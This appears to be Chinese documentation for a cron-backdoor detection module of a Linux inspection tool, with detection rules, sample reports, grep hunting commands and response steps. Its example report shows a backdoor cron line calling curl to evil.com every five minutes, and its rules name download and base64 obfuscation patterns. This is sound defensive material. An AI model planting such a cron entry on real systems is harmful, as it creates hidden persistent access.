# 06 - 定时任务检测

**Cron 后门检测模块**

---

## 功能说明

定时任务模块检测主机上的 Cron 定时任务，发现：
- 用户 cron 任务
- 系统 cron 任务
- 异常定时任务
- 可能的 cron 后门

---

## 检测内容

### 用户 Cron

| 检测路径 | 说明 |
|---|---|
| `/var/spool/cron/` | 用户 crontab 文件 |
| `/var/spool/cron/crontabs/` | Debian/Ubuntu 用户 crontab |
| `/etc/cron.d/` | 系统 cron.d 配置 |
| `/etc/cron.daily/` | 每日任务 |
| `/etc/cron.hourly/` | 每小时任务 |
| `/etc/cron.weekly/` | 每周任务 |
| `/etc/cron.monthly/` | 每月任务 |
| `/etc/crontab` | 系统 crontab |

### 异常检测规则

| 规则 | 描述 | 风险 |
|---|---|---|
| 境外 IP 下载 | cron 中包含境外 IP 的 wget/curl | 高 |
| Base64 编码命令 | 包含 base64 解码执行 | 高 |
| 可疑路径 | 从 /tmp、/var/tmp 执行脚本 | 中 |
| 频繁执行 | 执行间隔 < 5 分钟 | 中 |
| 隐藏任务 | 名称以 `.` 开头 | 中 |

---

## 输出示例

### HTML 报告

```
┌─────────────────────────────────────────┐
│  ⏰ 定时任务                              │
├─────────────────────────────────────────┤
│  用户 Cron: 3 个                          │
│  ├─ root: 5 个任务                        │
│  ├─ www-data: 1 个任务                   │
│  └─ app: 2 个任务                         │
│                                         │
│  系统 Cron: 12 个                         │
│                                         │
│  ⚠️ 发现可疑定时任务:                      │
│  └─ /etc/cron.d/backdoor                │
│     └─ */5 * * * * curl http://evil.com  │
└─────────────────────────────────────────┘
```

### JSON 输出

```json
{
  "cron": {
    "user_crons": [
      {"user": "root", "count": 5, "tasks": [...]},
      {"user": "www-data", "count": 1, "tasks": [...]}
    ],
    "system_crons": [
      {"path": "/etc/cron.daily/logrotate", "status": "ok"},
      {"path": "/etc/cron.d/backdoor", "status": "warning", "desc": "可疑任务"}
    ],
    "issues": [
      {
        "level": "warning",
        "module": "cron",
        "desc": "发现可疑 cron 任务: /etc/cron.d/backdoor"
      }
    ]
  }
}
```

---

## 告警规则

| 规则 | 条件 | 级别 | 说明 |
|---|---|---|---|
| 境外下载 | cron 包含境外 wget/curl | 严重 | 可能是后门 |
| Base64 执行 | 包含 base64 解码 | 严重 | 可能是混淆后门 |
| 可疑脚本 | 从临时目录执行 | 警告 | 可能是临时后门 |
| 频繁执行 | 每分钟或更频繁 | 警告 | 可能是挖矿 |

---

## 使用场景

### 日常巡检

```bash
./inspect.sh -m routine
# 自动包含 Cron 检测
```

### 手动检查 Cron

```bash
# 查看所有用户 crontab
for u in $(cut -d: -f1 /etc/passwd); do
  echo "=== $u ==="
  crontab -l -u "$u" 2>/dev/null || echo "(无)"
done

# 查看系统 cron
ls -la /etc/cron.d/
cat /etc/crontab

# 查看定时任务目录
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
```

### 排查可疑 Cron

```bash
# 查找可疑的 cron 任务
grep -r "wget\|curl\|lynx" /etc/cron* 2>/dev/null
grep -r "base64" /etc/cron* 2>/dev/null
grep -r "\/tmp" /etc/cron* 2>/dev/null

# 查找最近修改的 cron 文件
find /etc/cron* -mtime -7 -ls 2>/dev/null
```

---

## 故障排查

**Q: 发现可疑 cron 任务**

```bash
# 1. 查看任务内容
cat /etc/cron.d/suspicious

# 2. 查找关联文件
ls -la /path/to/script.sh

# 3. 检查脚本内容
cat /path/to/script.sh

# 4. 分析网络连接
ss -tlnp | grep $(pgrep -f script.sh)

# 5. 如果确认是后门，立即删除并排查
rm /etc/cron.d/suspicious
rm /path/to/script.sh
```

**Q: cron 服务未运行**

```bash
# 检查 cron 服务状态
systemctl is-active crond  # systemd
service crond status       # SysV init

# 启动 cron 服务
systemctl start crond
# 或
service crond start

# 设置开机自启
systemctl enable crond
```

---

*最后更新: 2026-06-11*